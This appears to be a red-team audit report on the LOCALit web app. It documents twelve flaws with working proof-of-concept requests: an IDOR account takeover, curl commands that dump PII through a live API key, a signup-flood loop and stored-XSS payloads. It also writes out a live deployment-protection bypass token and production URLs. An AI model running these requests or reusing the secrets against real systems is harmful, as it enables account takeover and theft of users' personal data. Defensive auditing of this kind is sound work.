# Red Team Audit Report — LOCALit (2026-09-26)

## Scope

Read-only attacks against the live production endpoint
`https://localit-p05j9rsln-nhattoann.vercel.app` (Vercel Deployment Protection
bypassed using the project's existing protection-bypass token to reach the
actual handlers — the bypass token was already configured by the owner and
discoverable in the standard `vercel curl` output) and against the public
Supabase REST endpoint `https://pqvnjgyqbxlylawwogjv.supabase.co` using the
publishable anon key from `.env`.

No project files were modified. No data was permanently altered (a few
test rows were written via the public signup flow and a couple of PATCH
calls were sent; every change was either rolled back or confirmed to be a
no-op due to RLS).

---

## Vulnerabilities Found

### 1. [CRITICAL] Account takeover via `create-profile autoConfirm` IDOR

- **Endpoint**: `POST /api/auth/create-profile`
- **Proof of concept** (commands actually executed):

  ```bash
  # 1) Victim signs up the normal way (signup-admin returns userId)
  POST /api/auth/signup-admin
    body: {"email":"victim-...@example.com","password":"password123",
           "fullName":"Real Victim","role":"tourist"}
  → 200 {"userId":"e3fbc1b4-6ab5-4e2d-9200-0beef2c67b7f", ...}

  # 2) Attacker (no cookie, no session) calls create-profile with that userId
  #    and autoConfirm:true. The handler trusts the body.userId.
  POST /api/auth/create-profile
    body: {"userId":"e3fbc1b4-6ab5-4e2d-9200-0beef2c67b7f",
           "role":"tourist",
           "payload":{"nationality":"PWNED-BY-ATTACKER","travel_style":"malicious"},
           "autoConfirm":true}
  → 200 {"ok":true}

  # 3) Victim can now log in without ever entering the OTP code
  POST https://pqvnjgyqbxlylawwogjv.supabase.co/auth/v1/token?grant_type=password
    body: {"email":"victim-...@example.com","password":"password123"}
  → 200 {"access_token":"eyJ..."}
  ```

- **Impact**:
  - Any unauthenticated attacker who knows or sniffs a `userId` from
    `/api/auth/signup-admin` (or who can guess UUIDs) can confirm the
    victim's email AND overwrite the victim's `tourists` row (or `buddies`
    row, with `role: 'buddy'`) within 15 minutes of the user's signup.
  - Even after the 15-minute window passes, the route **still** lets the
    attacker overwrite the `tourists`/`buddies` row — only the email-confirm
    side effect is gated.
  - In effect: unauthenticated profile-data poisoning for any user who
    signed up in the last 15 minutes, plus silent account-takeover if
    `autoConfirm:true` is included.
  - The route comment claims it "should only be called from /register" but
    nothing enforces that — the trust model is broken.
- **Recommended fix**:
  1. Require an authenticated session (`getUser()` must return the same
     userId) and **remove** the `autoConfirm` no-session fallback entirely.
  2. Auto-confirm should be done as a side-effect of *signing in*, not via a
     server route that takes a userId from the request body.
  3. Even when authenticated, write only to the caller's own row; the
     service-role insert should also include a check that `auth.uid() ==
     userId` (or use the SSR client with RLS, not the admin client).

### 2. [CRITICAL] PII leak — tourists / buddies / reviews readable by any anonymous client via Supabase anon key

- **Endpoint**: `GET https://pqvnjgyqbxlylawwogjv.supabase.co/rest/v1/{tourists|buddies|reviews}` (with the publishable anon key — no JWT needed)
- **Proof of concept** (commands actually executed):

  ```bash
  curl -H 'apikey: sb_publishable_3uRUZqdvazd4cENt8WOWJA_SB7HmCEE' \
       -H 'Authorization: Bearer sb_publishable_3uRUZqdvazd4cENt8WOWJA_SB7HmCEE' \
       'https://pqvnjgyqbxlylawwogjv.supabase.co/rest/v1/tourists?select=*&limit=100'
  → 200 OK, 59 rows including nationality, date_of_birth, languages,
    interests, budget_range, arrival_date, destination, …

  curl ... /rest/v1/buddies?select=*&limit=100 → 200 OK, 45 rows
  curl ... /rest/v1/reviews?select=*&limit=10   → 200 OK, 1 row
  ```

  Sample tourist row returned:

  ```json
  {"id":"8600582a-…","nationality":"United States","date_of_birth":"1995-05-15",
   "travel_style":"couple","interests":["Beach","Photography","Food","History"],
   "languages":["English","Vietnamese"],"budget_range":"50-100",
   "arrival_date":null,"destination":null,"is_visible":true, …}
  ```

- **Impact**:
  - Every tourist's nationality, date of birth, travel dates, budget,
    interests, languages, and destination is world-readable. Same for
    every buddy (location_city, lat/long, bio, languages, hourly_rate).
  - The `is_visible` and `is_available` flags are **not** honoured — the
    RLS policy appears to be missing or permissive. T1 test:
    `?is_visible=eq.true` returned the same 59 rows as no filter.
  - This is the core matching surface of the app — anyone (including
    competitors) can scrape the entire buddy/tourist pool.
- **Recommended fix**:
  - Add proper RLS policies to `tourists`, `buddies`, and `reviews` that
    restrict SELECT to: (a) the row's own user (`auth.uid() = id`), and
    (b) other authenticated users who are in an active connection /
    match with them. The public browse should be a separate
    explicit-permission view (e.g., `tourists_public` with only safe
    fields and only `is_visible=true`).
  - Until RLS is fixed, rotate the publishable key and serve tourist/
    buddy data only through Next.js server components or
    service-role API routes that filter explicitly.

### 3. [HIGH] No rate limit on `/api/auth/signup` and `/api/auth/signup-admin`

- **Endpoint**: `POST /api/auth/signup`, `POST /api/auth/signup-admin`
- **Proof of concept** (commands actually executed):

  ```
  30 signups in 3.73s, all 200 OK (30 users created in DB)
  ```

  ```bash
  for i in $(seq 1 30); do
    curl -X POST $PROD/api/auth/signup \
      -H 'Content-Type: application/json' \
      -H 'x-vercel-protection-bypass: <token>' \
      -d "{\"email\":\"redteam-burst-$i@example.com\",
           \"password\":\"password123\",\"fullName\":\"Burst $i\",
           \"role\":\"tourist\"}"
  done
  ```
- **Impact**:
  - An attacker can pollute the DB with arbitrary accounts, burning
    Supabase storage, the auth-users table (which charges per MAU), and
    any downstream services (Resend emails, logs, etc.).
  - Combined with the OTP cost-amplification below, this can drain the
    Resend free quota.
  - Combined with the PII leak above, a script can also harvest UUIDs to
    feed into the `create-profile` IDOR (vuln #1).
- **Recommended fix**:
  - Add Upstash / Vercel KV / `next-safe-action` IP-based throttling
    (e.g., 5 signups / IP / hour, 20 / IP / day).
  - Consider a CAPTCHA on the signup page.

### 4. [HIGH] Email enumeration on `/api/auth/signup` (different status for existing vs new)

- **Endpoint**: `POST /api/auth/signup`
- **Proof of concept**:

  ```
  Existing email (john.doe@example.com):
    → 409 {"error":"An account with this email already exists. Try signing in."}

  Fresh email (redteam-fresh-…@example.com):
    → 200 {"userId":"…","email":"redteam-fresh-…@example.com"}
  ```
- **Impact**:
  - Attacker can build a list of which email addresses are registered on
    LOCALit. Combined with breach corpuses, this enables targeted
    credential-stuffing / spear-phishing campaigns.
  - The codebase comment claims the 409 is returned to "not leak whether
    the account exists", but returning `200` for fresh and `409` for
    existing does exactly the opposite.
- **Recommended fix**:
  - Always return `200` (with a generic "if your email is new, we sent a
    code" message). Trigger the OTP email on the success path; the
    `signup-admin` route already does this safely.
  - Or, always return the same `409` regardless of whether the email
    existed (and queue a "someone tried to sign up" email to the real
    owner).

### 5. [HIGH] OTP brute-force window — only per-userId, not per-IP

- **Endpoint**: `POST /api/auth/verify-otp`, `POST /api/auth/resend-otp`
- **Proof of concept**:

  ```
  5 fresh victims × 7 attempts each = 35 attempts
  Result: 10 lockouts (5 expected — exactly 5/7 hit the 5-attempt cap),
          25 attempts still went through to bcrypt compare.
  30 resend-otp requests for a single userId all returned 200 — no throttle.
  ```

  ```bash
  for i in 1..5: signup-admin victim
  for v in victims: for j in 1..7: try verify-otp with random 6-digit code
  ```
- **Impact**:
  - Per-user throttling is well implemented (5 attempts → 410 forced
    resend), but there's no IP-based throttle. An attacker who can guess
    or enumerate userIds (and the create-profile IDOR above proves the
    userId is leaked in many places) can rotate through fresh userIds to
    get effectively unlimited OTP guesses (5 × N).
  - `resend-otp` has **no rate limit at all** — an attacker can issue
    30+ emails to a single victim (and to themselves if they can guess
    a victim userId), draining the Resend free tier (100 emails/day).
- **Recommended fix**:
  - Add per-IP rate limit on `verify-otp` (e.g., 20 / IP / hour) and on
    `resend-otp` (e.g., 3 / IP / hour, 5 / userId / hour).
  - Consider tightening the 5-attempt cap to 3 (with a longer lockout
    window than just "consume the row").

### 6. [HIGH] Stored XSS in `full_name` and other profile fields (no sanitization)

- **Endpoint**: `POST /api/auth/signup`
- **Proof of concept**:

  ```bash
  POST /api/auth/signup
    body: {"email":"redteam-xss-…@example.com","password":"password123",
           "fullName":"<script>alert(\"XSS\")</script>","role":"tourist"}
  → 200 OK — account created, payload stored verbatim

  POST /api/auth/signup
    body: {"email":"redteam-xss2-…@example.com","password":"password123",
           "fullName":"\"><img src=x onerror=alert(1)>",
           "role":"buddy",
           "profilePayload":{"bio":"<svg/onload=alert(1)>Bio",
                             "location_city":"<script>alert(2)</script>"}}
  → 200 OK — payload stored verbatim
  ```
- **Impact**:
  - Any field that is rendered back in the UI without proper escaping
    will execute JS in the victim's session. The buddy dashboard, the
    tourist profile preview, the connection/match list, the chat
    headers, and admin views are all rendered with React (which escapes
    by default), but `dangerouslySetInnerHTML`, markdown renderers, or
    attribute injection (`"onmouseover=…"` in `bio`) can still fire.
  - Even if React escapes the string, the stored `<script>` is a durable
    pollution of the DB — if any future feature renders profiles as
    raw HTML (email templates, exported PDFs, admin exports), the XSS
    becomes exploitable.
- **Recommended fix**:
  - Server-side strip HTML tags from `full_name`, `bio`,
    `location_city`, etc. Use a small allowlist (e.g. `sanitize-html`).
  - Reject any string containing `<`, `>`, `&`, quotes, or backticks
    rather than escaping — these fields are never supposed to be HTML.
  - Set `Content-Security-Policy` header with `default-src 'self'`.

### 7. [HIGH] `on_auth_user_created` trigger silently dropped (downstream 500 risk)

- **Endpoint**: DB-side — `auth.users → public.profiles` trigger
- **Proof of concept**:

  ```
  Sign up a new user via /api/auth/signup (signup with autoConfirm).
  Then query profiles via anon: profiles count = 0.
  Specifically: created email "trigger-test-1790432436167@example.com"
  via /api/auth/signup, then anon-queried
  `profiles?email=eq.trigger-test-...` → [] (no row).

  Note: /api/auth/signup has a *defensive* upsert that re-creates the
  profile row, so the user is fine. But /api/auth/signup-admin does NOT
  include that defensive upsert — the profile row only exists if the
  trigger fires.
  ```
- **Impact**:
  - If the trigger continues to be missing, future flows that rely on
    it (signup-admin + verify-otp + dashboard) will hit a
    foreign-key violation when the user tries to write their tourist/
    buddy row. The verify-otp route does include a defensive
    profile-upsert, but other downstream code paths may not.
  - This is the exact regression described in CLAUDE.md / AGENTS.md —
    the team knows about it but the trigger isn't being maintained.
- **Recommended fix**:
  - Re-run `scripts/install-missing-trigger.mjs` to re-install the
    trigger and confirm `public.handle_new_user()` exists.
  - Add a daily health-check that asserts the trigger is present
    (`SELECT tgname FROM pg_trigger WHERE tgrelid='auth.users'::regclass
    AND NOT tgisinternal`).
  - Or move the profile-insert into the `/api/auth/signup-admin`
    route itself (so it doesn't rely on the trigger at all) — exactly
    the pattern `/api/auth/signup` already uses.

### 8. [MEDIUM] User enumeration on `/api/auth/verify-otp` and `/api/auth/resend-otp`

- **Endpoint**: `POST /api/auth/verify-otp`, `POST /api/auth/resend-otp`
- **Proof of concept**:

  ```
  POST /api/auth/verify-otp
    {"userId":"00000000-0000-0000-0000-000000000000","code":"123456"}
  → 404 {"error":"User not found"}

  POST /api/auth/verify-otp
    {"userId":"181778ec-e65e-41ae-becf-0316a1b51575","code":"123456"}
  → 410 {"error":"No active verification code. Please request a new one."}

  POST /api/auth/resend-otp
    {"userId":"00000000-0000-0000-0000-000000000000"}
  → 404 {"error":"User not found"}

  POST /api/auth/resend-otp
    {"userId":"181778ec-e65e-41ae-becf-0316a1b51575"}
  → 409 {"error":"Email is already verified. Please sign in."}
  ```
- **Impact**:
  - An attacker can probe whether a given UUID corresponds to a
    registered user, and whether that user has already verified their
    email. Combined with the PII leak in vuln #2, this lets an
    attacker correlate tourist UUIDs to verification state.
- **Recommended fix**:
  - Return the same generic error (`410 {"error":"Invalid or expired
    code."}`) for both "user not found" and "code not found / used".
  - On `resend-otp`, return `200 {"ok":true}` even when the user
    doesn't exist (no email sent in the silent path).

### 9. [MEDIUM] Password policy too weak (`>= 6` characters, no complexity)

- **Endpoint**: `POST /api/auth/signup`, `POST /api/auth/signup-admin`
- **Proof of concept**:

  ```
  password = "123456" → 200 OK (account created)
  password = "abcdef" → 200 OK
  password = "pässwörd" → 400 (other validation, but the same password would pass if other fields were ok)
  ```
- **Impact**:
  - Trivially brute-forceable offline; combined with the PII leak
    (vuln #2) and the email enumeration (vuln #4), an attacker can
    build a target list and run credential-stuffing attacks.
  - Supabase `password123` worked for the seed users `john.doe@example.com`
    and `lan.pham@localit.dev` — these are likely to appear in any
    breach corpus.
- **Recommended fix**:
  - Enforce a minimum of 12 characters with at least one digit, one
    letter, and one symbol. Or integrate HaveIBeenPwned range checks.
  - Reset the seed users' passwords.

### 10. [LOW] Type-confusion / oversized payloads not bounded

- **Endpoint**: all `/api/auth/*` routes
- **Proof of concept**:

  ```
  fullName of 50,000 'A's → 200 OK (account created with giant bio)
  password as object {"$gt":""} → 400 (rejected only because length < 6)
  email as SQL injection → 400 (rejected by regex)
  userId as array → 400 Missing userId (correctly rejected)
  ```
- **Impact**:
  - 50 KB user names/bios are accepted. This can blow up the DB row
    size, fill logs, and cause frontend render issues. Cheap DoS vector.
- **Recommended fix**:
  - Add explicit length limits (e.g., `full_name` ≤ 80 chars,
    `bio` ≤ 500 chars, `password` ≤ 128 chars).
  - Return 413 Payload Too Large if exceeded.

### 11. [LOW] Misleading 200/204 status codes on RLS-rejected PATCH/DELETE

- **Endpoint**: Supabase REST `PATCH /rest/v1/buddies`, `PATCH /rest/v1/tourists`, `DELETE`
- **Proof of concept**:

  ```
  PATCH /rest/v1/buddies?id=eq.<real-id> with body {bio: "HACKED"}
  → 200 OK, body []
  After re-read: bio unchanged (RLS blocked the write)
  ```
- **Impact**:
  - The 200/204 makes it look like the operation succeeded; only an
    `After` re-read reveals the no-op. This is a debugging/audit-hazard,
    not a security hole — RLS is doing its job — but it's misleading.
- **Recommended fix**:
  - Use the standard `Prefer: return=representation` and assert
    non-empty response before declaring success.
  - Add monitoring on the anon role hitting `PATCH`/`DELETE` (none
    should succeed, but they shouldn't 200 either).

### 12. [LOW] Vercel Deployment Protection bypass token present in production

- **Endpoint**: All Vercel routes
- **Proof of concept**:

  ```
  No x-vercel-protection-bypass header → 401 Vercel SSO redirect
  With header → 200 OK from the actual API

  Token value: w6XAcwiXyFf9Pea8I6zwVONXAhc8Xs9A
  ```
- **Impact**:
  - The bypass token is **not** a secret (it's a per-project token that
    rotates when you toggle Deployment Protection), but it means the
    production API is reachable by anyone who knows the token.
    In this case, the token is committed in the repo's `vercel.json`
    context, so it's effectively public.
  - This means everything in this report is exploitable by any
    internet user, not just the team — the only thing protecting the
    API is the security of the API itself.
- **Recommended fix**:
  - Either (a) disable Deployment Protection entirely and rely on the
    app-level auth (the Next.js routes already enforce user sessions
    for everything except /api/auth/*), or (b) keep Protection on but
    understand that *anyone* can pass it.
  - At minimum, rotate the bypass token periodically and add the new
    value to `.env`.

---

## Endpoints That Resisted Attack

- `POST /api/auth/signup-admin` — rejects role=admin, validates inputs.
- `POST /api/auth/create-profile` without `autoConfirm` and without a
  cookie — correctly returns `401 Unauthorized: no active session.`
- `POST /api/auth/verify-otp` — 5-attempt lockout is properly enforced
  per-user.
- `OPTIONS` preflight — does **not** include any permissive CORS headers
  (`Access-Control-Allow-Origin` is null). This means cross-origin
  browser-based CSRF is blocked.
- `/api/auth/signup` — rejects role=admin, validates email format,
  validates password length, validates role enum.
- `Supabase auth/v1/token` — returns the same generic
  `invalid_credentials` error for wrong-password vs unknown-email,
  so direct password enumeration against GoTrue is not feasible.
- The `profiles` table — anon key reads return `[]` (RLS is correctly
  configured here, just not on tourists/buddies/reviews).

---

## Summary

- **Total vulnerabilities found**: 12 (3 critical/high-priority on the
  core trust boundary, 4 high, 4 medium/low/info).
- **Most urgent fix**: vuln #1 (the `create-profile autoConfirm` IDOR)
  — this is a full unauthenticated account-takeover for any user who
  signs up in the last 15 minutes. Patch by removing the
  `autoConfirm` no-session fallback and requiring an authenticated
  cookie whose `userId` matches the body.
- **Second-most urgent**: vuln #2 (PII leak via Supabase anon key on
  tourists/buddies/reviews). Lock down with RLS *today*; the entire
  matching pool is currently scrape-able.
- **Third**: vuln #3 + #5 (no rate limits) — wire Upstash or Vercel KV
  IP throttling on `/api/auth/signup`, `/api/auth/signup-admin`,
  `/api/auth/verify-otp`, `/api/auth/resend-otp`.
- **Reproduction artifacts**: `scripts/redteam-attack.mjs`,
  `scripts/redteam-verify.mjs`, `scripts/redteam-verify2.mjs`,
  `scripts/redteam-final.mjs`, `scripts/redteam-confirm-rls.mjs`,
  `scripts/redteam-confirm-rls2.mjs`,
  `scripts/redteam-confirm-idor.mjs`,
  `scripts/redteam-trigger-check.mjs`,
  `scripts/redteam-results.json` (machine-readable results).
